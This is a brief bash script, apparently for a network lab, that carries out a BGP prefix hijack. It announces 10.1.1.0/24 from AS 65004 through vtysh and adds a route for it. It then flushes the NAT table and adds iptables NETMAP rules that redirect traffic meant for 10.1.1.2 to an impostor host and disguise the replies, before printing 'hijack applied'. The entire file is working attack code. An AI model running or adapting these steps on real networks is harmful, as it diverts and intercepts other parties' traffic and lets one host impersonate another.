#!/bin/bash
vtysh -c 'configure terminal' -c 'router bgp 65004' -c 'network 10.1.1.0/24' -c 'end'
IFACE=$(ip -o -4 addr show | awk '$4 ~ /^10\.6\.1\.1\// {print $2}')
echo "asn4 10.6.1.1 iface: $IFACE"
ip route add 10.1.1.0/24 dev "$IFACE" 2>/dev/null || echo "route add: (may already exist)"
iptables -t nat -F
iptables -t nat -A PREROUTING -d 10.1.1.2 -m ttl --ttl-gt 1 -j NETMAP --to 10.6.1.2
iptables -t nat -A POSTROUTING -s 10.6.1.2 -j NETMAP --to 10.1.1.2
echo "hijack applied"
